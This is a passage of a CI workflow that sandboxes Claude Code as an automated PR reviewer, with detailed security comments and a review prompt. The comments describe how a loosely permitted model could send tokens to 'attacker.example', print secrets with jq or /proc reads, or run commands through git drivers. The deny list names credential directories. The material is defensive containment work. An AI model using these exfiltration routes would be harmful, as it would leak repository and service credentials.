          # helper cannot review itself, because the only copy the reviewer will
          # ever run is the trusted one, and that copy does not exist until the PR
          # lands. Saying so plainly is the difference between a maintainer reading
          # "expected, merge it" and reading "the reviewer is broken".
          if ! git cat-file -e "origin/$DEFAULT_BRANCH:scripts/review-gh.sh" 2>/dev/null; then
            refuse "the reviewer's GitHub helper is not on the $DEFAULT_BRANCH branch yet. If this is the PR that adds or renames scripts/review-gh.sh, that is expected and needs no fix: the reviewer only ever runs the trusted copy, so it starts working once this merges."
          fi

          mkdir -p "$HELPER_DIR"
          if ! git show "origin/$DEFAULT_BRANCH:scripts/review-gh.sh" >"$HELPER_DIR/review-gh.sh"; then
            refuse "the reviewer's GitHub helper could not be read from the $DEFAULT_BRANCH branch, and running this PR's copy of it is not an option."
          fi
          chmod 0500 "$HELPER_DIR/review-gh.sh"
          chmod 0500 "$HELPER_DIR"
          echo "Materialized scripts/review-gh.sh from origin/$DEFAULT_BRANCH (read-only)"

      # Timestamp cutoff for the verdict probe below, so it only looks at comments
      # this run could plausibly have posted (not leftovers from an earlier review
      # or re-review pass on the same PR). Since DOR-1665 that probe decides the
      # check's colour as well as its wording, which makes this cutoff part of the
      # gate: a window that started too early would let a previous pass's summary
      # vouch for a review that posted nothing this time.
      - name: Record review start time
        id: review-start
        run: echo "time=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"

      # Scale the turn budget with PR size (DOR-396): a 5-file PR and a 45-file
      # PR need very different amounts of read/grep/verify work to finish a
      # review, and one fixed cap starves the large ones. The numbers and the
      # measurements behind them are in the env block at the top of this file.
      - name: Count changed files
        id: pr-size
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Degrade to the floor budget rather than aborting the step: an
          # aborted step here would skip Claude Code review entirely. The final
          # gate would correctly stay red, but degrading lets the requested
          # review run instead of turning metadata lookup into a setup failure.
          # The degraded value is the MINIMUM, not the smallest possible budget:
          # a review whose size we could not measure is the last one that should
          # be starved.
          file_count=$(gh pr view "${{ steps.target.outputs.number }}" --repo "${{ github.repository }}" --json changedFiles --jq '.changedFiles' 2>/dev/null || echo 0)
          case "$file_count" in ''|*[!0-9]*) file_count=0 ;; esac

          # `if`, NOT `[ ... ] && assignment`: GitHub runs this with `bash -e`,
          # and a `&&` chain whose test is false returns 1 — which fails the step
          # when it is the last command in the block. merge-tail.yml has the long
          # version of that lesson.
          max_turns=$(( REVIEW_MAX_TURNS_BASE + REVIEW_MAX_TURNS_PER_FILE * file_count ))
          if [ "$max_turns" -lt "$REVIEW_MAX_TURNS_MIN" ]; then max_turns=$REVIEW_MAX_TURNS_MIN; fi
          if [ "$max_turns" -gt "$REVIEW_MAX_TURNS_MAX" ]; then max_turns=$REVIEW_MAX_TURNS_MAX; fi

          echo "max_turns=$max_turns" >> "$GITHUB_OUTPUT"
          echo "files=$file_count" >> "$GITHUB_OUTPUT"
          echo "$file_count files changed; turn budget $max_turns"

          # Recorded where the collector can read it without opening a log, so
          # "did raising the budget stop the `error_max_turns` failures?" is a
          # question the ledger can answer against the budget actually used
          # rather than against the one this file happens to declare today.
          {
            echo "### automated review"
            echo
            echo "- changed files: $file_count"
            echo "- turn budget: $max_turns"
          } >> "$GITHUB_STEP_SUMMARY"

      # THE CHECK'S COLOUR IS NOT THIS STEP'S TO DECIDE (DOR-1665).
      #
      # `continue-on-error` hands that to "Decide the check" at the bottom of the
      # job, which goes RED for every failure here except one: the review's own
      # result message said it finished cleanly AND its verdict is verifiably on
      # the PR. Measured on PR #1409 (run 33524055964) — the review posted
      # "0 important, 1 nit" plus an inline finding, and the action then threw
      # "Claude reported a successful result after 52 turns, exceeding the
      # configured maximum of 50". That is an assertion the action makes AFTER the
      # run has ended (base-action/src/run-claude-sdk.ts): the SDK let a clean run
      # overshoot `--max-turns` by two, and a finished review became a red check
      # that merge-tail will not arm a PR with.
      #
      # Raising the budget is not the fix. The overshoot is relative to whatever
      # cap is set, so a bigger number moves the cliff instead of removing it —
      # and the cap has to stay, because it is what bounds a runaway loop inside
      # the 25-minute job timeout above.
      #
      # What this line costs, stated plainly: a failure here is now silent on its
      # own, so the two steps below are the ONLY things between a broken reviewer
      # and a green check. Read all three as one unit. "Decide the check" defaults
      # to red and its whole block is pinned in
      # scripts/test-review-classifier.sh, which is what keeps it that way.
      #
      # BOOTSTRAP, once: the verdict is computed by the copy of
      # scripts/classify-review-failure.sh on the DEFAULT BRANCH (nothing executed
      # in this job may come from the PR's checkout), so the PR that ADDS the
      # `stands` mode cannot benefit from it — the trusted copy has no such mode
      # until that PR lands, `stands` falls back to `no`, and the check stays red
      # exactly as it did before. Same shape as the review-helper bootstrap above,
      # and it needs no fix: the comment posted in that case is the pre-DOR-1665
      # "the machinery failed, the verdict above is complete" wording.
      - name: Claude Code review
        id: claude-review
        continue-on-error: true
        uses: anthropics/claude-code-action@v1
        env:
          # The reviewer's destination, read by scripts/review-gh.sh. It lives in
          # the environment rather than in the helper's arguments precisely so the
          # model cannot supply it: step `env:` reaches the CLI's shell because the
          # action spawns it as a child process, and the Bash matcher refuses the
          # `VAR=x cmd` prefix that would let a tool call override it.
          REVIEW_REPO: ${{ github.repository }}
          REVIEW_PR: ${{ steps.target.outputs.number }}
          # DEFENCE IN DEPTH, not a control (DOR-464). These blunt one specific
          # escalation: git executes a `diff.external` / `GIT_EXTERNAL_DIFF` driver
          # through `sh -c`, and that driver is configurable from `$HOME/.gitconfig`
          # — so anything able to write that file turns the next `git` invocation
          # into arbitrary command execution. Pointing both config scopes at an
          # empty file makes git ignore such a driver (measured: the same payload
          # that ran without these did not run with them, and normal `git log` /
          # `git show` still worked).
          #
          # It is deliberately NOT what closes that hole. The hole is closed by the
          # allow-list below granting no `git` at all, and by no remaining grant
          # being able to write a file in the first place. Treat these two lines as
          # a seatbelt for a future grant that re-introduces git, and do not let
          # their presence be used as an argument for re-adding one: a `git` grant
          # would still reach `-O<cmd>` on `git grep`, which runs the pager through
          # a shell with no config involved.
          GIT_CONFIG_GLOBAL: /dev/null
          GIT_CONFIG_SYSTEM: /dev/null
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          # WHO MAY TRIGGER A REVIEW, beyond a human with write access. The
          # action refuses a non-User actor unless it is named here
          # (src/github/validation/actor.ts, `checkHumanActor`), which is why
          # every Dependabot PR's review failed with "Workflow initiated by
          # non-human actor" — 5 of 52 failures over 30 days, report 07 §6.
          # Matching is case-insensitive and strips a trailing `[bot]` on both
          # sides, so `dependabot` and `dependabot[bot]` are the same entry.
          #
          # Exactly two names, never `*`. The action's own warning is that `*`
          # on a public repo lets any external App invoke it with a prompt it
          # controls; naming two bots keeps that closed. Both are this repo's
          # own automation:
          #   * dependabot[bot] — the author of the dependency PRs. Note this
          #     alone does not make those reviews work; see "Check the reviewer
          #     has a credential" above for what GitHub withholds from them.
          #   * dorkos-merge-tail[bot] — merge-tail re-requests a lost review by
          #     applying the `re-review` label (merge-tail.yml), and on a
          #     `labeled` event the ACTOR is whoever applied the label, not the
          #     PR author. Without this entry every retry would fail on the
          #     actor check. If the app's login is ever not this string, the
          #     symptom is a retry failing with the action's own message naming
          #     the login it actually saw, which is then a one-word fix here.
          # The job `if:` above still requires a same-repo PR, so nothing here
          # widens who can reach this job from a fork.
          allowed_bots: 'dependabot[bot],dorkos-merge-tail[bot]'
          # Plain-prompt review following Anthropic's "Automatic PR Code Review"
          # recipe. The earlier code-review plugin variant ran but posted nothing:
          # it was never granted the comment-posting tools, so it hit a permission
          # denial and produced no review. The prompt below names the posting tools
          # explicitly and `claude_args` allow-lists them.
          prompt: |
            REPO: ${{ github.repository }}
            PR NUMBER: ${{ steps.target.outputs.number }}
            INLINE COMMENTS: ${{ github.event_name == 'workflow_dispatch' && 'review-gh.sh inline' || 'inline-comment tool' }}

            You are reviewing this pull request as a senior DorkOS engineer.

            Complete this as one uninterrupted, one-shot review. Do all analysis
            yourself in this session: do not delegate to subagents, start
            background work, or schedule a later wakeup. Do not return until you
            have posted the required top-level summary.

            You have no `gh` command. Every GitHub call goes through one helper,
            which already knows this repo and this PR, so you never pass either:

              bash ${{ runner.temp }}/trusted/review-gh.sh diff
              bash ${{ runner.temp }}/trusted/review-gh.sh view <jsonFields>
              bash ${{ runner.temp }}/trusted/review-gh.sh summary '<body>'
              bash ${{ runner.temp }}/trusted/review-gh.sh inline <file> <line> '<body>'

            `view` takes comma-separated JSON field names, e.g. `view labels`,
            `view comments` or `view files` for the changed-file list, and prints
            raw JSON for you to read — it takes no jq expression, and `diff` takes
            no flags. Nothing else about these commands is negotiable: extra
            flags, a different path, or `gh` on its own will all be refused. Below,
            `review-gh.sh <args>` is shorthand for one of the four lines above —
            type the full command.

            To search the tree and read files, use the Grep, Glob and Read tools.
            That helper is the ONLY shell command you have: there is no `gh`, no
            `grep`, no `rg`, no `git`, no `ls`. Do not spend turns rediscovering
            that — Grep and Glob cover every search this review needs, dot-
            directories included, in a single pass.

            First, read REVIEW.md and AGENTS.md at the repository root and apply
            them in full, including REVIEW.md's "How to review" process, the
            deletion dangling-reference sweep, the conventions checks, and the
            path-specific focus. Treat DorkOS Hard Rule violations (FSD layers, SDK
            import confinement, the os.homedir ban, marketplace rollback safety) as
            Important severity. Respect the nit cap, skip lists, and verification
            bar.

            Set the review scope before you start, from the PR labels
            (`review-gh.sh view labels`):
            - `review:light` present: quick pass only. Post only 🔴 Important
              findings; skip nits and the deletion sweep.
            - `review:deep` present: be exhaustive. Trace every caller and run the
              full dangling-reference sweep.
            - otherwise: the standard review.
            Then check whether you have already reviewed this PR (look for your own
            prior summary comment via `review-gh.sh view comments`). If you have,
            this is a RE-REVIEW: read your prior findings, treat addressed or
            resolved ones as done, review only what changed since your last pass,
            and post only NEW or still-unaddressed 🔴 Important findings. Do not
            repeat resolved findings and do not raise fresh nits on a re-review.

            The code under review is already checked out: on an automatic run that
            is the PR's test-merge ref (the PR merged into its base), and on a manual
            dispatch it is the PR's head. Use `review-gh.sh diff` for the changes and
            read the surrounding files for context. One exception: `.claude/`,
            `.mcp.json`, `CLAUDE.md` and `.husky` on disk are reverted to a trusted
            branch's versions, not this PR's, because a PR must not be able to make
            its own reviewer execute hooks the PR wrote. Judge changes to those paths
            from the diff, never from disk. Work outward from the diff: for every
            symbol the PR changes, removes, or renames, search the repo for its
            callers and references before judging the change safe. For any PR that
            DELETES or RENAMES files, paths, exports, commands, hooks, or config
            keys, run the dangling-reference sweep (search the whole tree for every
            removed identifier, in prose and config too) before concluding it is
            clean.

            Verify each finding against the actual file (Grep or Read)
            before posting; drop anything you cannot cite with a `file:line`. A false
            Important costs the author a round trip.

            Post each finding on the line it applies to. INLINE COMMENTS at the top
            of this prompt says how, because the two triggers differ:

            - `inline-comment tool`: use
              `mcp__github_inline_comment__create_inline_comment` (with
              `confirmed: true`).
            - `review-gh.sh inline`: that tool is NOT available on this run (the
              action registers it only for PR events, not manual dispatch). Do not
              try it. Post each finding with
              `bash ${{ runner.temp }}/trusted/review-gh.sh inline <file> <line> '<finding>'`
              instead. It resolves the head commit itself, so there is no SHA to
              look up first.

            The helper's `inline` works on either trigger, so if the tool above is
            refused or errors twice in a row, switch to it rather than retrying.
            Should that fail too, stop and fold every remaining finding into the
            summary comment, each one prefixed with `file:line`, so nothing is
            silently dropped.

            Then post a one-line severity tally (e.g. "1 important, 3 nits") as a
            top-level summary with `review-gh.sh summary`.
            Only post GitHub comments; do not submit the review as a chat message.
            If there are no blocking issues, post a brief "No blocking issues
            found" summary comment.
          # --setting-sources user (DOR-457, security): without it the SDK defaults
          # to ["user","project","local"] (base-action/src/parse-sdk-options.ts), so
          # the CLI loads the checkout's own `.claude/settings.json`,
          # `.claude/settings.local.json` AND `.mcp.json`, and acts on them — hooks,
          # env vars, apiKeyHelper, project MCP servers — before any tool gating.
          # Measured on CC 2.1.219 with a project `.mcp.json` and a project
          # SessionStart hook, each spawning a marker process: no flag → both fired;
          # `user,project,local` → both fired; `user` → neither did. It fires even
          # with an invalid key, so a bad token is not protection.
          #
          # So this flag covers `.mcp.json` too, and it OVERLAPS the revert step
          # above rather than dividing the work with it. The revert step is still
          # doing something this flag does not: it is the only thing that covers what
          # is not a settings source and so is untouched here — `CLAUDE.md`,
          # `.claude/` context files (skills, agents, commands), `.claude.json`,
          # `.gitmodules`, `.ripgreprc`. Two independent controls over `.mcp.json` is
          # the intent, not an accident.
          #
          # `user` is the scope the action writes its own settings into, so nothing
          # the action needs is lost — but that is narrower than it reads. It also
          # drops this repo's own deny list from `.claude/settings.json`
          # (`Read(./.env)`, `Read(./**/*.pem)`, `Read(./Secrets/**)`, ...). On a
          # throwaway runner with none of those files present that costs nothing, and
          # the reviewer's permissions come from --allowedTools instead — but it is a
          # real narrowing of protection, not a free one.
          #
          # THE BUILT-IN SURFACE (DOR-1948). `--allowedTools` approves calls; it
          # does NOT decide which built-in tools the model can see. Three reviews
          # exited successfully while Agent-spawned reviewers were still running,
          # so the verdict gate correctly found no summary and failed the job.
          # `--tools` is the availability boundary: Bash is present for the one
          # approved helper below, and Read/Grep/Glob cover the review itself.
          # Omitting Agent and the task/scheduling tools makes a one-shot action
          # incapable of handing work to a future turn. The flag does not affect
          # MCP tools, so the inline-comment tool remains separately permissioned
          # by `--allowedTools`.
          #
          # THE ALLOW-LIST (DOR-464). Five entries, and exactly ONE of them is a
          # Bash grant: the helper materialized above. Read the CONTAINMENT
          # INVARIANT in the header before adding a sixth — the list is asserted
          # against an exact expected set in scripts/test-review-classifier.sh, so
          # any addition fails the harness on purpose.
          #
          # Why not a narrower `gh` pattern instead of a helper: Claude Code's Bash
          # matcher is a PREFIX match. It refuses chaining (`&&`, `;`, newline),
          # command substitution, pipes, redirection and extending the matched path —
          # all probed — but it ALLOWS extra flags on the same invocation, plus
          # `$VAR` expansion. So no pattern short of an exact match can forbid
          # `--hostname attacker.example -H "Authorization: Bearer $GH_TOKEN"`,
          # `--repo attacker.example/a/b` (measured: `gh pr diff` and `gh pr view`
          # connect to any host given one) or `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'`
          # (measured: prints the process environment, no grep required). A
          # fixed-shape helper removes the choice rather than pattern-matching it.
          #
          # What the reviewer lost, and why nothing needed replacing. `grep` and `rg`
          # were the `/proc/self/environ` read; `git log`, `git show` and `git grep`
          # were arbitrary command execution (header). `Read`, `Grep` and `Glob` are
          # granted below, are workspace-confined, and cover every search REVIEW.md
          # actually asks for: its four process steps want the diff, the changed-file
          # list, the enclosing code, and a search for callers of changed symbols.
          # REVIEW.md asks for no history at all — the claim that it "tells the
          # reviewer to trace history" was this file's, not REVIEW.md's — so no
          # `log`/`show` subcommand was added to the helper to replace them. Every
          # subcommand is surface that has to be proved shell-free; the cheapest way
          # to keep that proof short is to not add one for a capability nothing needs.
          # `Bash(ls:*)` went too: `Glob` does it, and one fewer entry is one fewer
          # thing to vouch for.
          #
          # One line now, not two. The dispatch-only grant that used to sit here
          # existed because the action registers the github_inline_comment MCP
          # server only for PR entity events (src/mcp/install-mcp-server.ts), so on
          # dispatch that tool does not exist and the hatch would silently degrade
          # to summary-only, dropping every line-level finding. The helper's
          # `inline` subcommand covers both triggers, so the fallback no longer
          # needs a trigger-conditional grant of its own.
          #
          # The deny list makes the invariant's "cannot read the process
          # environment" clause true by construction instead of by assertion.
          # `Read` is NOT workspace-confined — measured on Claude Code 2.1.219, a
          # bare `Read` grant reads /etc/hosts — and `--setting-sources user` drops
          # this repo's own `Read(...)` deny list (see the note above), so nothing
          # else was stopping it.
          #
          # THE DOUBLE SLASH IS LOAD-BEARING. A single leading slash anchors the
          # pattern at the settings source, not the filesystem root, so
          # `Read(/etc/**)` silently protects nothing. Measured, same version: with
          # `Read(/etc/**)` the read succeeded; with `Read(//etc/**)` it was
          # refused. A wrong pattern here fails OPEN and quietly, which is why it is
          # asserted in scripts/test-review-classifier.sh and why this stays a
          # second layer rather than the control.
          #
          # `~/**` is deliberately NOT denied: on a GitHub runner HOME is
          # /home/runner and the checkout is /home/runner/work/<repo>/<repo>, so
          # denying the home tree would deny the entire workspace and break every
          # review. Only the credential directories under it are named. Verified
          # that the review still reads workspace files with this list applied.
          #
          # `Read(...)` COVERS `Grep` TOO, and `Grep(...)` does not exist as a
          # path-scoped rule. This is worth stating because the intuitive patch —
          # adding `Grep(//etc/**)` alongside — is the one that does NOT work, and
          # it would read as protection while providing none. Measured, same
          # version, grepping /etc/hosts with only `Grep` granted:
          #   no deny rule                -> content returned
          #   deny `Grep(//etc/**)`       -> content STILL returned
          #   deny `Read(//etc/**)`       -> refused
          # So the list above is already the whole control for the file tools.
          # (`Glob` is not separately denied: it returns path names, not contents.)
          claude_args: |
            --tools "Bash,Read,Grep,Glob"
            --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(bash ${{ runner.temp }}/trusted/review-gh.sh:*),Read,Grep,Glob"
            --disallowedTools "Read(//proc/**),Read(//sys/**),Read(//etc/**),Read(~/.claude/**),Read(~/.config/**),Read(~/.ssh/**)"
            --setting-sources user
            --max-turns ${{ steps.pr-size.outputs.max_turns }}

      # Self-explaining infra failures (DOR-396): a review that dies produces a red
      # check indistinguishable from a red check backed by real findings, forcing a
      # human to read Actions logs to tell them apart. Post a plain comment naming
      # the cause — but the cause has to be *read*, not assumed. This step used to
      # assert one cause for every failure (DOR-457): nine runs across three PRs
      # died at turn 1 having spent nothing, and each was announced as "ran out of
      # its turn budget", which sent the maintainer looking at --max-turns instead
      # of at credentials and quota.
      #
      # The classification lives in scripts/classify-review-failure.sh, pinned by
      # scripts/test-review-classifier.sh against fixtures taken from real runs.
      # Do not re-inline it. The first DOR-457 fix still got this wrong because it
      # split on turns and spend and never read `subtype` — the field that says why
      # the run ended — so a usage limit crossed at turn 20 would still have been
      # announced as an exhausted turn budget. The fixtures exist so that exact
      # shape (subtype "success" with is_error:true after real work, the action's
      # own separate failure class) stays a caught regression.
      #
      # SECURITY (review round 3, finding 1): run that script from the DEFAULT
      # BRANCH, never from the checkout. `scripts/` is not in the action's
      # SENSITIVE_PATHS and not in the revert step above, and on BOTH triggers the
      # checkout is PR-authored (the merge ref on `pull_request`,
      # `refs/pull/N/head` on dispatch) — so `bash scripts/...` would execute a
      # shell script a PR wrote, inside a job that holds CLAUDE_CODE_OAUTH_TOKEN
      # and, via `id-token: write`, can mint the action's App token with
      # contents/pull_requests/issues WRITE. The server-side guard that stops a PR
      # rewriting THIS file does not help: it validates the workflow file, so a PR
      # touching only `scripts/` sails past it. Extracting the jq for testability
      # is what moved it into untrusted space; `git show` puts it back.
      #
      # This is the general rule for this job, not a one-off: nothing executed here
      # may come from the checkout. Everything else already complies — the other
      # steps run only `gh`, `git`, `date` and shell builtins from the runner image,
      # and both `uses:` are remote actions resolved by GitHub, not files on disk.
      #
      # The action hides its transcript (`show_full_output` defaults false, and this
      # repo is public so it should stay that way), which is why nobody could tell
      # these apart from the logs. The result message's own error string is
      # surfaced instead — flattened to one line, with backticks and token-shaped
      # strings stripped, inside a fenced block so it cannot break out of the
      # comment or ping anyone.
      #
      # This step decides whether the review stands for EVERY action outcome
      # (DOR-1665, DOR-1877), because deciding it and wording it need the same two
      # facts — how the run ended, and whether the verdict is on the PR — and
      # asking for them twice is how the two would drift apart. It answers both,
      # hands `stands` to the gate below, and posts a comment only when the answer
      # is no. A skipped action has no execution result to classify, so the final
      # always-running gate handles that setup failure directly.
      - name: Verify the review result and posted verdict
        id: verdict
        if: always() && steps.claude-review.outcome != 'skipped'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EXECUTION_FILE: ${{ steps.claude-review.outputs.execution_file }}
          PR_NUMBER: ${{ steps.target.outputs.number }}
          REPO: ${{ github.repository }}
          REVIEW_OUTCOME: ${{ steps.claude-review.outcome }}
          SINCE: ${{ steps.review-start.outputs.time }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          # Prefer the action's own output; fall back to the path it logs, since a
          # composite action's outputs are not guaranteed to survive its failure.
          exec_file="$EXECUTION_FILE"
          if [ -z "$exec_file" ] || [ ! -f "$exec_file" ]; then
            exec_file="$RUNNER_TEMP/claude-execution-output.json"
          fi

          # Materialize the classifier from the trusted branch (see the SECURITY
          # note above) and run THAT copy. `git show <ref>:<path>` reads the object
          # database, so a PR cannot influence it whatever it does to the worktree —
          # including deleting the script, which just makes the trusted copy the
          # only one there is.
          #
          # If it cannot be materialized, degrade to `unknown` instead of exiting:
          # refusing to run PR-authored code is the fail-closed part, but aborting
          # here would also skip the comment below, which turns a wrongly-worded red
          # check into a silent one — the DOR-396 symptom this whole step exists to
          # prevent. The `unknown` wording points at the Actions log and invents no
          # cause, which is exactly right when the classifier could not be reached.
          classifier="$RUNNER_TEMP/classify-review-failure.sh"
          why=unknown
          reported=
          limit=
          have_classifier=
          if [ -z "$DEFAULT_BRANCH" ]; then
            echo "::warning::Could not resolve the default branch; skipping failure classification rather than running the PR's copy of the classifier."
          elif ! git show "origin/$DEFAULT_BRANCH:scripts/classify-review-failure.sh" >"$classifier" 2>/dev/null; then
            echo "::warning::Could not read scripts/classify-review-failure.sh from origin/$DEFAULT_BRANCH; skipping failure classification rather than running the PR's copy."
          else
            have_classifier=yes
            why=$(bash "$classifier" class "$exec_file") || why=unknown
            reported=$(bash "$classifier" reported "$exec_file") || reported=
            limit=$(bash "$classifier" limit "$exec_file") || limit=
          fi
          echo "review result class: $why (from $exec_file)"

          # Handed to "Report the outcome class" below, which turns the pair
          # into the single word the collector reads. Emitted here because this
          # is the only step that holds the trusted classifier's answers, and
          # asking for them twice is how two callers drift apart.
          echo "class=$why" >> "$GITHUB_OUTPUT"
          case "$limit" in session | weekly | unknown) ;; *) limit= ;; esac
          echo "limit=$limit" >> "$GITHUB_OUTPUT"

          # Was a verdict already posted? Scoped to comments this run could have
          # made, so an earlier pass's summary is not mistaken for this one's.
          #
          # Since DOR-1665 this answer can turn a red check green, so it is scoped
          # to a BOT's comment as well as to this run's window: the reviewer posts
          # its summary through scripts/review-gh.sh with the action's App token
          # (as `claude[bot]`, verified on PR #1409), and a human saying "no
          # blocking issues" in the same four minutes must not be mistaken for a
          # review that never happened. `github-actions[bot]` is deliberately NOT
          # excluded on top of that: this step's own comment is posted after the
          # question is asked and an earlier run's predates `$SINCE`, so excluding
          # it guards nothing — while a future action release that fell back to
          # `GITHUB_TOKEN` would make the exclusion silently reject real verdicts.
          #
          # RESIDUAL, named rather than defended: this proves a BOT posted a
          # verdict-shaped comment in the window, not that THE REVIEWER did. Any
          # bot able to comment here — another workflow in this repo, say — could
          # satisfy it. Reaching that needs push access, since a fork PR never gets
          # this far (see the header), which is the same trust boundary the rest of
          # this job already assumes; and closing it would mean pinning an app
          # login the action is free to change, trading a documented gap for a
          # silent one. So it stays open and written down.
          #
          # No pipe anywhere in here, on purpose. `grep -q` exits at its first match
          # and closes the pipe; whatever is on the left then dies of SIGPIPE (141),
          # and the runner's `-o pipefail` makes that the status of the whole
          # pipeline — turning a verdict that WAS posted into "not found", which
          # then tells the author their review was lost when it is sitting right
          # above the comment. Capturing `gh` into a variable first (the round-2 fix)
          # only moved the pipe; it still failed the same way once the comments
          # exceeded the 64 KB pipe buffer with a match early in them. Measured with
          # the matching line first: 4 KB → 0, 1.5 MB → 141. A here-string writes to
          # a temp file with no upstream process to kill: 1.5 MB → 0.
          verdict_posted() {
            local bodies
            bodies=$(gh api --paginate "repos/$REPO/issues/$PR_NUMBER/comments" \
              --jq ".[] | select(.created_at > \"$SINCE\") | select(.user.type == \"Bot\") | .body" 2>/dev/null) || return 1
            grep -qE '[0-9]+ important|[0-9]+ nits?|No blocking issues|No factual issues' \
              <<<"$bodies"
          }

          # Asked once, here, and reused by both the gate and the wording below —
          # the two must never be able to disagree about whether the verdict is on
          # the PR. A `gh` failure means "could not confirm", which is `no`.
          if verdict_posted; then posted=yes; else posted=no; fi

          # The only route to a green check, and it is the trusted classifier's
          # call, not the action's exit status: `yes` requires the run's own
          # result message to say it ended cleanly AND `posted` to be `yes`.
          # No classifier means no verdict, which means red — the same fail-closed
          # direction as everything else that reads from the default branch.
          stands=no
          if [ -n "$have_classifier" ]; then
            stands=$(bash "$classifier" stands "$exec_file" "$posted") || stands=no
          fi
          case "$stands" in yes | no) ;; *) stands=no ;; esac
          echo "stands=$stands" >> "$GITHUB_OUTPUT"
          echo "verdict posted: $posted; review stands: $stands"

          # Green from here on. A successful action needs no extra explanation.
          # For a failed action whose clean review still stands, say what happened
          # in the log without adding PR noise.
          if [ "$stands" = yes ]; then
            if [ "$REVIEW_OUTCOME" = failure ]; then
              echo "::warning::The review finished and its verdict is on this PR, so this check stays green. Something in the machinery around the review failed; the step that failed is in $RUN_URL."
              if [ -n "$reported" ]; then
                echo "Claude reported: $reported"
              fi
            fi
            exit 0
          fi

          case "$why" in
            no)
              body="This check is red because the review never started — Claude got no answer from the model, so nothing in this PR was looked at. That is a problem with the reviewer, not with this PR: usually the Claude subscription behind \`CLAUDE_CODE_OAUTH_TOKEN\` has hit its usage limit (it clears on its own), or that token needs regenerating. Add the \`re-review\` label to try again."
              ;;
            max_turns)
              # Not "the verdict above stands". The check is red precisely because
              # it does NOT stand: the run said it ended abnormally, so whatever it
              # posted is a partial pass, and telling the author otherwise would
              # invite them to treat a truncated review as a finished one.
              if [ "$posted" = yes ]; then
                body="This check is red because the review ran out of its turn budget wrapping up, not because it found more issues. What it already posted is worth reading, but the pass was cut short, so a re-review is owed. Add the \`re-review\` label for a fresh pass."
              else
                body="This check is red because the review ran out of its turn budget before it could post a verdict, not because it found blocking issues. Add the \`re-review\` label to try again."
              fi
              ;;
            died)
              # Deliberately does not say WHERE it died. This class now covers an
              # error the run named for itself, which can happen at turn 1 (an MCP
              # server that failed to start) or at turn 40 (a usage limit crossed
              # mid-review) — so naming a point in the run would be the same kind of
              # guess this step exists to stop making. The Reported line below
              # carries the run's own words.
              if [ "$posted" = yes ]; then
                body="This check is red because the review hit an error and stopped. It did not run out of turns, and this is not a finding about your code. What it already posted is worth reading, but the pass was cut short, so a re-review is owed. Add the \`re-review\` label for a fresh pass."
              else
                body="This check is red because the review hit an error and stopped before it could post a verdict. It did not run out of turns, and this is not a finding about your code. Add the \`re-review\` label to try again."
              fi
              ;;
            completed)
              # Two different situations, and conflating them is how this file has
              # gone wrong before. `completed` with a verdict on the PR normally
              # leaves through the green exit above, so reaching here with
              # `posted=yes` means the classifier could not be asked at all — the
              # bootstrap case, where the copy on the default branch predates the
              # `stands` mode, plus any future run where it cannot be materialized.
              # The review is fine and the verdict is complete; say that, exactly
              # as this arm said before DOR-1665, rather than accusing a reviewer
              # that posted its findings of having posted nothing.
              if [ "$posted" = yes ]; then
                body="This check is red even though the review itself finished and reported success, so whatever failed is in the machinery around the review, not the review. The verdict above is the complete one. The step that failed is in the [Actions log]($RUN_URL)."
              else
                body="This check is red because the review reported success but never posted a verdict, so nothing here has actually been reviewed. That is a problem with the reviewer, not with this PR. The review run is in the [Actions log]($RUN_URL). Add the \`re-review\` label to try again."
              fi
              ;;
            *)
              body="This check is red because the review did not finish, not because it found blocking issues — and it left no readable record of why, so the reason is only in the [Actions log]($RUN_URL). Add the \`re-review\` label to try again."
              ;;
          esac

          if [ -n "$reported" ]; then
            echo "::error::Claude reported: $reported"
            body="$body"$'\n\nReported:\n\n```\n'"$reported"$'\n```'
          fi

          gh pr comment "$PR_NUMBER" --repo "$REPO" --body "$body"

      # WHAT KIND OF FAILURE WAS THIS? One word, written where something other
      # than a human reading Actions logs can find it.
      #
      # WHY IT EXISTS. `review-completes` is the SLO for "the automated review
      # finishes the first time", and today it is computed purely from the run's
      # conclusion (packages/ci-steward/src/series.ts, `reviews`): every red run
      # counts against it equally. ci/slos.yaml already says the population
      # should exclude subscription usage-limit stalls and says why it does not —
      # "not yet separable in phase 1; counted as failures until the classifier
      # exists". This is that classifier's output. A quota stall is a wait, not a
      # defect; a fork is out of scope by design; a review that ran and posted a
      # verdict is a success even when the action then threw. Scoring all four as
      # one number measures the subscription's weather, not our pipeline.
      #
      # THE CLASSES, and what each one means for whoever reads it:
      #   reviewed        the review ran and its verdict is on the PR (green)
      #   no_verdict      it reported success and posted nothing (our bug)
      #   turn_budget     it exhausted --max-turns (the budget is too small)
      #   quota_session   the 5-hour subscription window is spent (wait)
      #   quota_weekly    the weekly subscription window is spent (wait)
      #   quota_unknown   a subscription limit that did not name its window
      #   no_credentials  there was no usable token at all (our setup)
      #   fork            refused because the PR comes from a fork (by design)
      #   infra           everything else that failed (our bug, cause unknown)
      #
      # WHERE IT GOES, and why twice. The job summary is for a person opening the
      # run. The `::notice::` annotation is for a machine: annotations are
      # readable through the API (`check-runs/{job_id}/annotations`) without
      # downloading a log, so the collector can join a class to a run when
      # `review-completes` is re-based on it. Neither is wired into the
      # collector by this change ON PURPOSE — changing the metric's population
      # in the same window as the changes it is measuring would make the
      # before/after comparison meaningless. Emit first, measure with it later.
      #
      # THE CLASS NEVER DECIDES THE CHECK. "Decide the check" below is unchanged
      # and still reads only `stands`. This step cannot turn a red run green, and
      # it must not grow that power: a class is produced partly from the run's
      # own error text, and the whole verdict architecture rests on that text
      # never being able to vouch for anything.
      #
      # WHAT IT CANNOT SEE, stated rather than left as a silent gap: a fork PR on
      # `pull_request` never reaches this job at all (the job `if:` skips it), so
      # only the dispatch path can report `fork`. Classifying the skipped ones
      # needs the always-running `review-gate` job, which is phase 2 (DOR-2151,
      # plans/ci-steward-plan.md §5.3) and deliberately not in this change.
      - name: Report the outcome class
        if: always()
        env:
          STANDS: ${{ steps.verdict.outputs.stands }}
          CLASS: ${{ steps.verdict.outputs.class }}
